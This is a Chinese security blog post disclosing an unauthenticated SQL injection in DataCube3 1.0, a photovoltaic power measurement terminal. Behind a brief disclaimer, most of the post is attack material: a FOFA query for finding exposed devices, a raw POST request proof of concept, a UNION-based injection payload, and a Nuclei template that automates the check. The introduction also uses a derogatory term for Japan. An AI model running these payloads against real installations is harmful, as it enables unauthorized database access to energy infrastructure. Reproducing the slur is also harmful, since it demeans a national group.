#  DataCube3 getting_index_data.php SQL注入漏洞   
原创 lcyunkong  云途安全   2024-04-19 23:03  
  
**0x00 阅读须知**  
  
****  
**免责声明：****本文提供的信息和方法仅供网络安全专业人员用于教学和研究目的，不得用于任何非法活动。读者若使用文章内容从事任何未授权的行为，需自行承担所有法律责任和后果。本公众号及作者对由此引起的任何直接或间接损失不负责任。请严格遵守相关法律法规。**  
###   
### 0x01 漏洞简介  
  
  
DataCube3是一个用于光伏电力生成系统的紧凑型终端测量系统。这个系统在1.0版本中被发现存在未经身份验证的SQL注入漏洞，可允许未认证的恶意用户在数据库中执行任意SQL查询 。小日子国家用得比较多。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Z8DAfzBiajSbAIl9niaicFP7LAZGibm5CXl536rtYWgIa4SLCFNueWUn5E2ZJ8m9N0XZYpDWI76zPY8Niartyue60Ow/640?wx_fmt=png&from=appmsg "")  
###   
### 0x02 漏洞详情  
  
****  
**fofa：****title="DataCube3"**  
  
****  
**Poc：**  
```
POST /admin/pr_monitor/getting_index_data.php HTTP/1.1
Host: 0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: SESS_IDS=m70644umgu9qhcblivgqvbfhpd; PHPSESSID=fqf954nsik4j80md6mu1jd1fhk
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

req_id=1*
```  
  
**pyload：**  
```
1) UNION ALL SELECT CHAR(113,120,107,107,113)||CHAR(117,78,85,110,71,119,86,122,111,101,81,87,68,72,80,107,90,112,111,110,120,72,78,70,76,99,100,81,80,77,89,75,86,65,105,99,74,67,122,107)||CHAR(113,106,120,122,113),NULL,NULL-- sTqG
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Z8DAfzBiajSbAIl9niaicFP7LAZGibm5CXl5GfsRGHNYpBST70rdZAWiazBSHzGFlk6n2aMaLibNlw1vicibGEzsVRLXvw/640?wx_fmt=png&from=appmsg "")  
  
  
**0x03 Nuclie**  
  
```
id: DataCube3-getting_index_data-sqli

info:
  name: DataCube3-getting_index_data-sqli
  author: unknow
  severity: high
  description: DataCube3 getting_index_data.php SQL注入漏洞
  tags: DataCube3, sqli
  metadata:
    fofa-query: title="DataCube3"

http:
  - raw:
      - |              
        POST /admin/pr_monitor/getting_index_data.php HTTP/1.1
        Host: 
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
        Accept: */*
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 9
        
        req_id=1) UNION ALL SELECT CHAR(113,120,107,107,113)||CHAR(117,78,85,110,71,119,86,122,111,101,81,87,68,72,80,107,90,112,111,110,120,72,78,70,76,99,100,81,80,77,89,75,86,65,105,99,74,67,122,107)||CHAR(113,106,120,122,113),NULL,NULL-- sTqG

    matchers:     
      - type: dsl
        name: sqli
        dsl:
          - '(status_code==200 && contains(body, "qxkkquNUnGwVzoeQWDHPkZponxHNFLcdQPMYKVAicJCzkqjxzq"))'
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Z8DAfzBiajSbAIl9niaicFP7LAZGibm5CXl5kicjyCpyHpYk0XlhD87AJlMn4zAibPTG3WfibxpBCBFtRicz1pZic9pR6Ng/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
